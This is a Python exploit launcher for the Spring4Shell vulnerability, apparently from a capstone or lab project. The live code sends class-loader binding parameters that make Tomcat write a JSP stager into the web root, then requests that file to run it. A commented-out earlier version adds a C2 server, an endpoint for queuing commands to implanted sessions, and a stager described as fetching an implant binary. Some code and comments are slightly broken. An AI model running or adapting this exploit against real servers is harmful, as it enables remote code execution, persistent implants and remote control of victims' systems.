#!/usr/bin/env python3
import sys
import time
import requests

# ─── Arg parsing ──────────────────────────────────────────────────────────────
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <TARGET_URL>")
    sys.exit(1)

TARGET_URL  = sys.argv[1].rstrip("/") + "/"   # e.g. "http://127.0.0.1:8080/"
STAGER_PATH = "payload.jsp"                    # your local JSP

# ─── Deploy JSP via Spring4Shell ─────────────────────────────────────────────
#binary has permission to change its effective uid 
def deploy_stager():
    print("[+] Loading JSP stager…")
    try:
        with open(STAGER_PATH, "r") as f:
            jsp = f.read()
    except IOError as e:
        print(f"[-] Cannot open {STAGER_PATH}: {e}")
        sys.exit(1)

    print(f"[*] JSP length = {len(jsp)} bytes")
    if not jsp.strip():
        print("[-] JSP file is empty!")
        sys.exit(1)

    # build the 5 parameters
    filename = STAGER_PATH.rsplit(".", 1)[0]  # "payload"
    form_fields = {
        # 1) JSP body
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": jsp,
        # 2) Force .jsp
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        # 3) ABSOLUTE path into the exploded ROOT webapp maybe ./webapps/ROOT
        "class.module.classLoader.resources.context.parent.pipeline.first.directory":
            "/usr/local/tomcat/webapps/ROOT",
        # 4) Base name
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": filename,
        # 5) No timestamp - removed from filename
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }

    print(f"[+] Firing exploit POST to {TARGET_URL}")
    resp = requests.post(
        TARGET_URL,
        data=form_fields,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=5
    )
    print(f"[*] Exploit request → HTTP {resp.status_code} (expected ~200/404)")

    # ─── Verify INSIDE the container ────────────────────────────────────────────
    print("[*] Now exec into the container and run:")
    print("    find /usr/local/tomcat/webapps/ROOT -name payload.jsp")
    print("  to see if the file is really there.")
    print("  If you see it, you can curl it from the host:")
    print("    curl -I http://127.0.0.1:8080/payload.jsp")

# ─── Trigger the JSP stager ───────────────────────────────────────────────────
def trigger_stager():
    url = TARGET_URL + "payload.jsp"
    print(f"[+] Triggering {url} …")
    r = requests.get(url, timeout=5)
    print(f"[*] Trigger GET → HTTP {r.status_code}")

# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    print("── Stage0 Exploit Launcher ──")
    deploy_stager()
    time.sleep(2)
    trigger_stager()

if __name__=="__main__":
    main()


# """
# spring4shell-capstone – Stage-0 exploit launcher
# ================================================
# - Writes `payload.jsp` stager by malicious `class.module…` binding
# - Verifies write, then triggers stager to fetch the implant binary

# Usage
# -----
# $ python stage0_exploit.py http://10.0.0.50:8080/

# Security notes
# --------------
# * Network-range guard rails (--cidr 10.0.0.0/24)
# * Single-shot; exits if host already infected
# """
# #skeleton to deploy and trigger Spring4Shell JSP stager, then optionally enqueuing an initial command on the C2 server.

# import requests
# import time
# import sys
# import urllib.parse
# from urllib.parse import quote_plus

# #Config
# TARGET_URL = "http://127.0.0.1:8080/"  # base URL of vulnerable app
# STAGER_PATH = "payload.jsp"             # local path to your JSP stager
# C2_API = "http://127.0.0.1:8000"      # base URL of your C2 server
# ADMIN_ENQUEUE = f"{C2_API}/admin/enqueue"

# # def deploy_stager():
# #     """
# #     TODO: IMPLEMENT ACTUAL EXPLOIT UPLOAD LOGIC HERE.
# #     Basically has to drop 'payload.jsp' into the webapp directory.
# #     """

# #     print("[+] deploy_stager: placeholder for JSP upload via Spring4Shell.")
# #     #ex:
#     #files = {'file': open(STAGER_PATH, 'rb')}
#     #resp = requests.post(f"{TARGET_URL}/path/to/vulnerable/endpoint", files=files)
#     #assert resp.status_code == 200

# def deploy_stager():
#     """
#     Deploy the JSP stager via the Spring4Shell vulnerability by
#     writing payload.jsp into the webapp directory.
#     """
#     print("[+] deploy_stager: reading local JSP stager…")
#     try:
#         with open(STAGER_PATH, 'r') as f:
#             jsp = f.read()
#             print(f"[*] Read JSP, length = {len(jsp)} bytes")
#             if not jsp.strip():
#                 print("[-] JSP file seems empty!")
#             sys.exit(1)
#     except IOError as e:
#         print(f"[-] Failed to open {STAGER_PATH}: {e}")
#         sys.exit(1)

#     filename = STAGER_PATH.rstrip('.jsp')  # "payload"
#     form_fields = {
#         # raw JSP body goes here
#         "class.module.classLoader.resources.context.parent.pipeline.first.pattern": jsp,
#         # ensure .jsp extension
#         "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
#         # empty → drop into webapps/ROOT?
#         "class.module.classLoader.resources.context.parent.pipeline.first.directory": "",
#         # base name
#         "class.module.classLoader.resources.context.parent.pipeline.first.prefix": filename,
#         # empty → no timestamp, file is exactly payload.jsp
#         "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
#     }

#     print("[+] Sending exploit POST to write payload.jsp…")
#     resp = requests.post(
#         TARGET_URL,
#         data=form_fields,
#         headers={"Content-Type": "application/x-www-form-urlencoded"}
#     )
#     print(f"[+] deploy_stager() returned HTTP {resp.status_code}")
#     if resp.status_code != 200:
#         print("[-] Exploit POST failed; response body:")
#         print(resp.text)
#         sys.exit(1)

#     print(f"[+] If successful, payload.jsp should now live at {TARGET_URL.rstrip('/')}/payload.jsp")


# # def trigger_stager(): #to fetch and launch implant through jsp
# #     stager_url = TARGET_URL.rstrip('/') + f"/{STAGER_PATH}"
# #     print(f"[+] Triggering stager at {stager_url}")
# #     resp = requests.get(stager_url)
# #     if resp.status_code not in (200, 204):
# #         print(f"[-] Unexpected HTTP status: {resp.status_code}")
# #     else:
# #         print("[+] Stager triggered.")
# def trigger_stager():
#     stager_url = TARGET_URL.rstrip("/") + "/payload.jsp"
#     print(f"[+] Triggering payload.jsp → {stager_url}")
#     r = requests.get(stager_url)
#     if r.status_code in (200, 204):
#         print("[+] payload.jsp executed (implant should be dropped)")
#     else:
#         print(f"[-] payload.jsp returned HTTP {r.status_code}")


# def wait_for_implant(delay=10): #placeholder to wait for implant to check in
#     print(f"[+] Waiting {delay} seconds for implant to check in...")
#     time.sleep(delay)

# def enqueue_command(): #manual input required
#     sid = input("Enter the session ID (printed by implant/server logs): ").strip()
#     cmd = input("Enter the command to enqueue: ").strip()
#     payload = {'sid': sid, 'cmd': cmd}
#     resp = requests.post(ADMIN_ENQUEUE, json=payload)
#     if resp.ok:
#         print(f"[+] Command '{cmd}' enqueued for session {sid}")
#     else:
#         print(f"[-] Failed to enqueue: {resp.status_code} {resp.text}")


# def main():
#     print("------ Stage 0 Exploit Skeleton ------")
#     deploy_stager()
#     time.sleep(2)
#     trigger_stager()
#     wait_for_implant(delay=15)
#     print("[!] You can now enqueue commands through the admin API")
#     #enqueue_command() # uncomment to automate

# if __name__ == '__main__':
#     main()


